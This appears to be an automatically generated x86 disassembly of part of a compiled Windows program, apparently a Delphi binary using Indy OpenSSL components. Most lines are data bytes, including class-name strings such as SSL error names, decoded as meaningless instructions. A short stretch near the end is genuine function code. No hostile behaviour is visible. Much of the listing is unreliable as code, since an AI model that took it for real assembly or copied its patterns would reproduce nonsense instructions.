add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xd2
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
outsd
je r-xdata
dec esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
outsd
jb r-xdata
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st2
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push edx
outsb
inc ebx
outsd
outsb
add [ eax ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x45 ] dh
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
shl [ ecx + edx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
cmp al 0xd3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ ebp ] cl
or al 0x0
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xd3
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
jb r-xdata
outsd
outsd
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
inc ebp
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] cl
rol [ ebp ] cl
add [ eax ] al
sub_45d0a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
shl al 0xd0
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ ebp ] 0x1
or al 0x0
add [ eax ] al
insb
iretd
inc ebp
add [ eax + eax ] cl
sub_45d0be
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
xor [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
je r-xdata
jne r-xdata
rol [ eax - 0x2f ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xd2
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
outsd
je r-xdata
dec esi
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
inc ebp
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
shl al 0xd0
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ ebp ] 0x1
or al 0x0
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
outsd
jb r-xdata
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st2
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push edx
outsb
inc ebx
outsd
outsb
add [ eax ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x45 ] dh
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
shl [ ecx + edx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
cmp al 0xd3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ ebp ] cl
or al 0x0
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xd3
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
jb r-xdata
outsd
outsd
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
inc ebp
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] cl
rol [ ebp ] cl
add [ eax ] al
sub_45d11e
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x4f644945 ] dl
xor [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xd2
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
outsd
jb r-xdata
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st2
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push edx
outsb
inc ebx
outsd
outsb
add [ eax ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x45 ] dh
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
shl [ ecx + edx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
cmp al 0xd3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ ebp ] cl
or al 0x0
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xd3
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
jb r-xdata
push ebx
push ebx
dec esp
inc edi
je r-xdata
dec edi
je r-xdata
outsd
outsd
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
inc ebp
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] cl
rol [ ebp ] cl
add [ eax ] al
jne r-xdata
rol [ eax - 0x2f ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
outsd
je r-xdata
dec esi
dec esi
outsd
je r-xdata
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
inc ebp
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
shl al 0xd0
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ ebp ] 0x1
or al 0x0
add [ eax ] al
insb
iretd
sub_45d182
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
push edx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
outsd
jb r-xdata
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st2
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] ch
jb r-xdata
je r-xdata
js r-xdata
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
cmp al 0xd3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ ebp ] cl
or al 0x0
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xd3
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x45 ] dh
inc ebp
jb r-xdata
outsd
outsd
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
inc ebp
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] cl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xd2
sub_45d31a
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
push ebx
je r-xdata
or ah dl
inc ebp
imul ebp [ esi + 0x67 ] 0x68706943
jb r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ah dl
inc ebp
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
shl [ ebx + edx * 8 + 0x45 ] 0x0
push j_sub_40382c#6
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0045d4
add [ eax ] al
add [ edi + ecx * 8 + 0x45 ] ch
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x72 ] si
jb r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0xc0045 ] ah
add [ eax ] al
insb
iretd
outsd
jb r-xdata
mov esi [ ebx + 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_45d53e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403eac
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pushad
aad 0x45
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
aam 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x45
imul ebp [ esi + 0x67 ] 0x74726543
cmp al 0xd3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 ] bh
mov eax [ ebp - 0x8 ]
call sub_40416c
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4041b8
mov eax [ ebp - 0xc ]
call sub_40436c
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_4082c8
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d545
mov eax [ rw-data ]
call sub_424574
retn
inc esp
popad
je r-xdata
push 0x45d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2c ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
or bh bh
push ecx
mov esi [ fs : ebx + 0x34 ]
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xd3
outsd
jb r-xdata
inc ebp
jb r-xdata
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
rol [ ebp ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st2
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
sub_45d382
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
